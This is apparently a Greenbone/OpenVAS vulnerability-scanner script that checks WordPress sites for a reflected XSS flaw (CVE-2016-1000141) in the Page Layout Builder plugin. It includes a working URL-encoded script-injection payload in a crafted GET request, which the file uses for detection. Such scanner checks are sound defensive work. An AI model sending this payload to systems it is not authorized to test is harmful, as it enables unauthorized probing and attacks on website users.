# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.809081");
  script_version("2024-05-07T05:05:33+0000");
  script_cve_id("CVE-2016-1000141");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2024-05-07 05:05:33 +0000 (Tue, 07 May 2024)");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2016-11-28 19:57:00 +0000 (Mon, 28 Nov 2016)");
  script_tag(name:"creation_date", value:"2016-10-25 11:30:49 +0530 (Tue, 25 Oct 2016)");
  script_name("WordPress Page Layout Builder Plugin < 2.0.0 Reflected XSS Vulnerability - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://www.vapidlabs.com/wp/wp_advisory.php?v=358");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/93804");

  script_tag(name:"summary", value:"The WordPress Page Layout Builder Plugin is prone to a reflected
  cross-site scripting (XSS) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to an insufficient sanitization of user supplied
  input via variable 'layout_settings_id' to the file
  '/page-layout-builder/includes/layout-settings.php'.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to create a
  specially crafted request that would execute arbitrary script code in a user's browser session
  within the trust relationship between their browser and the server.");

  script_tag(name:"affected", value:"WordPress Page Layout Builder Plugin version 1.9.3 and probably
  prior.");

  script_tag(name:"solution", value:"Update to version 2.0.0 or later.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + '/wp-content/plugins/page-layout-builder/includes/layout-settings.php?' +
            'layout_settings_id=%22%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E%3C%22';

if(http_vuln_check(port:port, url:url, check_header:TRUE,
   pattern:"<script>alert\(document\.cookie\);</script>",
   extra_check:"/page-layout-builder/includes/layout-settings\.php")) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
